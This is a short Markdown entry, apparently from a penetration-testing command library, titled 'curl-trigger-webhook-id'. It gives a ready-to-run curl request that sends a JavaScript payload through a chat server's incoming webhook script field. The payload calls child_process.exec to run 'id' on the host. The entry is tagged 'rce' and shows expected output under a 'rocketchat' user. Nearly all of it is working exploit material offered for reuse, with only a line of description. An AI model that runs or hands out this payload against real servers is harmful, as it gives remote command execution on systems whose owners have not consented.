---
id: cmd-curl-id-trigger
data: >-
  curl -X POST 'http://target:3000/hooks/webhook_id_here' -H 'Content-Type:
  application/json' -d
  '{"text":"ignore","script":"require(\"child_process\").exec(\"id\", {stdio:
  \"pipe\"}, (err, stdout) => {console.log(stdout.toString())})"}'
tags:
  - rce
  - trigger
type: command
output: uid=65533(rocketchat)...
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:19.851Z'
verified: false
validated: true
submitted: true
---
# curl-trigger-webhook-id

## Command

```bash
curl -X POST 'http://target:3000/hooks/webhook_id_here' -H 'Content-Type: application/json' -d '{"text":"ignore","script":"require(\"child_process\").exec(\"id\", {stdio: \"pipe\"}, (err, stdout) => {console.log(stdout.toString())})"}'
```

## Description

Triggers the webhook to execute id.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| script | Exec payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST ... (as above)
```

## Expected Output

Response with UID/GID details.

## Related

- [[commands/curl-trigger-webhook-whoami]]
